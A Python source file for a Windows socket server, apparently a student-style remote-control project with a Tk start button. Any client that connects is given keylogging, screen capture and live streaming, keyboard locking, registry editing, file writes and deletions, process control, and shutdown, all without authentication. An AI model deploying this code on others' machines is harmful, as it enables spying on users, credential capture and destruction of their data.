import socket
import os
import threading
import pyautogui
import subprocess
import signal
import image
import numpy as np
from tkinter import *
from tkinter import Image
from typing import AsyncIterable, List, get_origin
from pynput import keyboard
import pyWinhook as pyHook
import pythoncom
import re, uuid
import winreg
import socket, cv2, pickle,struct,imutils
from PIL import ImageGrab
import time
from os import listdir
from ctypes import *
import string
import shutil

PORT = 1010
HOST = socket.gethostbyname(socket.gethostname())
ADDR = (HOST, PORT)
HEADER = 1024
FORMAT = "utf8"
msg=""

winregConst = {                                                                                                                                                                                                                                                                                                                                     
    'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
    'HKEY_CURRENT_USER' : winreg.HKEY_CURRENT_USER,
    'HKEY_LOCAL_MACHINE' : winreg.HKEY_LOCAL_MACHINE,
    'HKEY_USERS' : winreg.HKEY_USERS,
    'HKEY_PERFORMANCE_DATA' : winreg.HKEY_PERFORMANCE_DATA,
    'HKEY_CURRENT_CONFIG' : winreg.HKEY_CURRENT_CONFIG,
    'HKEY_DYN_DATA' : winreg.HKEY_DYN_DATA,
    'String': winreg.REG_SZ,
    'Binary': winreg.REG_BINARY,
    'DWORD': winreg.REG_DWORD,
    'QWORD': winreg.REG_QWORD,
    'Multi-String': winreg.REG_MULTI_SZ,
    'Expandable String': winreg.REG_EXPAND_SZ
}

SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER.bind(ADDR)
                                                                                                                                                                                                                                        
def receive(client):
    global msg
    msg = client.recv(HEADER).decode(FORMAT)
    print(f"msg from [{client}] {msg}") 
    client.sendall("Msg received".encode(FORMAT)) 
    return msg

#shut down
def shutdown():
    os.system("shutdown /s /t 15")

def logout():
    os.system("shutdown -l")
                                                                                            
#registry
def registry(client):
    while True:
        m = receive(client)
        if m == 'send file':
            rq=client.recv(HEADER)
            try:
                file = open('regFile.reg', 'wb')
                file.write(rq)
                file.close()
                temp = subprocess.call(['reg', 'import', 'regFile.reg'])
                client.send("done".encode(FORMAT))
            except:
                client.send("error".encode(FORMAT))
        
        if m == 'Get value':
            path = receive(client)
            path = path.split('\\', 1)
            valueName = receive(client)
            try:
                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
                temp = winreg.QueryValueEx(key, valueName)
                winreg.CloseKey(key)
                client.send(temp[0].encode(FORMAT))
            except:
                client.send("error".encode(FORMAT))
        
        if m == 'Set value':
            path = receive(client)
            path = path.split('\\', 1)
            valueName = receive(client)
            data = receive(client)
            dataType = receive(client)
            try:
                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
                temp = winreg.SetValueEx(key, valueName, 0, winregConst[dataType], data)
                winreg.CloseKey(key)
                client.send("done".encode(FORMAT))
            except:
                client.send("error".encode(FORMAT))
            pass            

        if m == 'Delete value':
            path = receive(client)
            path = path.split('\\', 1)
            valueName = receive(client)
            try:
                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
                temp = winreg.DeleteValue(key, valueName)
                winreg.CloseKey(key)
                client.send("done".encode(FORMAT))
            except:
                client.send("error".encode(FORMAT))

        if m == 'Create key':
            path = receive(client)
            path = path.split('\\', 1)
            try:
                key = winreg.CreateKey(winregConst[path[0]], path[1])
                winreg.CloseKey(key)
                client.send("done".encode(FORMAT))
            except:
                client.send("error".encode(FORMAT))
        
        if m == 'Delete key':
            path = receive(client)
            path = path.split('\\', 1)
            try:
                winreg.DeleteKey(winregConst[path[0]], path[1])
                client.send("done".encode(FORMAT))
            except:
                client.send("error".encode(FORMAT))
        if m == "QUIT":
            break
        
#take screenshot

def screenshot(client):
    image = pyautogui.screenshot("screenshot.png")
    img = open("screenshot.png","rb")
    output=open("writescreenshot.png","wb")
    bytesIMG = img.read(1024)
    while (bytesIMG):
        client.sendall(bytesIMG)
        msg = client.recv(HEADER)
        output.write(bytesIMG)
        bytesIMG = img.read(1024)
    client.send("Complete!".encode(FORMAT))

def videostream(client):
    while True:
        img = ImageGrab.grab(bbox=None)
        narray = np.array(img)
        frame = cv2.resize(narray, (960, 540))
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        a = pickle.dumps(frame)
		
        message = struct.pack("Q",len(a))+a
        
        client.sendall(message)
        msg = client.recv(HEADER).decode(FORMAT)
        if 'Complete!' in msg:
            client.sendall("Complete".encode(FORMAT))
            break

def folderstructure(client):
    path=''
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter + ':')
        bitmask >>= 1
    data = pickle.dumps(drives)
    client.send(data)
    path=""
    while True:
        m=receive(client)
        if m == 'GOTO':
            m1 = client.recv(HEADER).decode(FORMAT)
            if path != "":
                path += '\\'    
            path += m1
            path += '\\'
            lsdir = [f for f in os.listdir(path) if (not f.startswith('.')
                            | (f.startswith('$'))
                            | ("DAT" in f) | ("dat" in f) | (".ini" in f))]
            for f in lsdir:
                if '.' not in f:
                    try:
                        os.listdir(path + f)
                    except:
                        lsdir.remove(f)

            data = pickle.dumps(lsdir)
            client.send(data)

        if m == 'BACK':
            path += '..\\'
            lsdir = [f for f in os.listdir(path) if (not f.startswith('.')
                            | (f.startswith('$'))
                            | ("DAT" in f) | ("dat" in f) | (".ini" in f))]
            for f in lsdir:
                if '.' not in f:
                    try:
                        os.listdir(path + f)
                    except:
                        lsdir.remove(f)
                        
            data = pickle.dumps(lsdir)
            client.send(data)

        if m == 'RECEIVE':
            file_name = client.recv(HEADER).decode(FORMAT)

            f = open(path + file_name, "wb")

            dataf = client.recv(HEADER)
            while (dataf != b"Done!"):
                f.write(dataf)
                client.sendall("rc".encode(FORMAT))
                dataf = client.recv(HEADER)
            f.close()
  
        if m == 'DELETE':
            f_name = client.recv(HEADER).decode(FORMAT)
            if '.' in f_name:
                os.remove(path + f_name)
            else:
                shutil.rmtree(path + f_name)

        if m == 'QUIT':
            break
     
#keystroke/keylog
keyboardRecord = '' #string save record value
recorded = False
def processKeyPress(key: keyboard.KeyCode):
    key = str(key)
    key = key.replace("'", "")
    global keyboardRecord
    print(key)
    if len(key) == 1:
        keyboardRecord += key
    if (key == 'Key.enter'):
        keyboardRecord += '\n'
    if (key == 'Key.space'):
        keyboardRecord += ' '

#keylock
keylock = False
def uMad(event):
    return False

def Mad(event):
    return True

def unlockkeyboard():
    import keyboard
    for i in range(180):
        keyboard.unblock_key(i)    

def lockkeyboard():
    import keyboard
    for i in range(180):
        keyboard.block_key(i)

def keylog(client):
    while True:
        m=receive(client)
        if m == "HOOK":
            listener = keyboard.Listener(on_press=processKeyPress)
            global recorded
            global keyboardRecord
            if recorded == False:
                recorded = True
                listener.start()
        
        if m == "UNHOOK":
            if recorded == True:
                recorded = False
                listener.stop()
        
        if m == "PRINT KEYBOARD":
            if keyboardRecord != '':
                client.send(keyboardRecord.encode(FORMAT))
                keyboardRecord = ''
            else:
                client.send("None!!!".encode(FORMAT))
        global keylock
        if m == "LOCK":
            if keylock == False:
                lockkeyboard()
                keylock = True
            
        
        if m == "UNLOCK":
            if keylock == True:
                unlockkeyboard()
                keylock = False
            else:
                pass

        if m == "QUIT":
            break

#app running
def application(client):
    while True:
        m = receive(client)
        if m == "XEM":
            cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            full_msg = ''
            for line in proc.stdout:
                if not line.decode()[0].isspace():
                    full_msg += (str(line.decode().rstrip())+"\n")
                    #print(msgg)
                    #client.send(msgg.encode(FORMAT))
            client.send(full_msg.encode(FORMAT))
            
        if m == "KILL":
            while True:
                rq  = receive(client)
                if rq == "KILLID":
                    id = int(receive(client))
                    try:
                        os.kill(id, signal.SIGTERM)
                        client.send("Done!!!".encode(FORMAT))
                    except:
                        client.send("Error!!!".encode(FORMAT))

                if rq == "QUIT":
                    break
        if m == "START":
            test = True
            while test:
                rq = receive(client)
                if rq == "STARTID":
                    name = receive(client)
                    name += ".exe"
                    try:
                        subprocess.Popen(name)
                        client.send("Done!!!".encode(FORMAT))
                    except:
                        client.send("Error!!!".encode(FORMAT))
                    #os.system(name)
                if rq == "QUIT":
                    test = False
                    break
        if m == "QUIT":
            break  

#process running
def process(client):
    while True:
        m = receive(client)
        if m == "XEM":
            output = os.popen('wmic process get description, processid').read()
            client.send(output.encode(FORMAT))
            client.send("Complete!".encode(FORMAT))
        if m == "KILL":
            while True:
                rq  = receive(client)
                if rq == "KILLID":
                    id = int(receive(client))
                    try:
                        os.kill(id, signal.SIGTERM)
                        client.send("Done!!!".encode(FORMAT))
                    except:
                        client.send("Error!!!".encode(FORMAT))

                if rq == "QUIT":
                    break
        if m == "START":
            test = True
            while test:
                rq = receive(client)
                if rq == "STARTID":
                    name = receive(client)
                    name += ".exe"
                    try:
                        subprocess.Popen(name)
                        client.send("Done!!!".encode(FORMAT))
                    except:
                        client.send("Error!!!".encode(FORMAT))
                    #os.system(name)
                if rq == "QUIT":
                    test = False
                    break
        if m == "QUIT":
            break
# Displaying the output

#mac address
def macaddress(client):
    mac = '-'.join(re.findall('..', '%012x' % uuid.getnode()))
    client.send(mac.encode(FORMAT))

def handle_client(client, client_addr):
    print(f"[NEW CONNECTION] {client} connected.")
    while True:
        msg = receive(client)
        #print(f"msg from [{client}] {msg}") 
        #client.send("Msg received".encode(FORMAT))  #notify msg received
            #handle the request
        if msg == "SHUTDOWN":
            shutdown()
        if msg == "LOGOUT":
            logout()
        if msg == "REGISTRY":
            registry(client)
        if msg == "SCREENSHOT":
            screenshot(client)
        if msg == "VIDEO":
            videostream(client)
        if msg == "KEYLOG":
            keylog(client)
        if msg == "APPLICATION":
            application(client)
        if msg == "PROCESS":
            process(client)
        if msg == "MAC":
            macaddress(client)
        if msg == "FOLDER":
            folderstructure(client)
        if msg == "EXIT":
            break 
    client.shutdown(2)
    client.close()
    root.destroy()

def start():
    SERVER.listen()
    print(f"[LISTENING] Server is listening on {HOST}")
    while True:
        client, client_addr = SERVER.accept()
        thread = threading.Thread(target=handle_client, args=(client, client_addr))
        thread.start()

#Start
root = Tk()     
root.title('Server')    
root.geometry("255x200")    
# Create a Button
btn = Button(root, text = 'START SERVER', width=15, bg='BLACK', fg='WHITE', height=4, command = start)
# Set the position of button on the top of window.  
btn.grid(row=0, column=0, padx=65, pady=50, sticky='NSEW')   

root.mainloop()
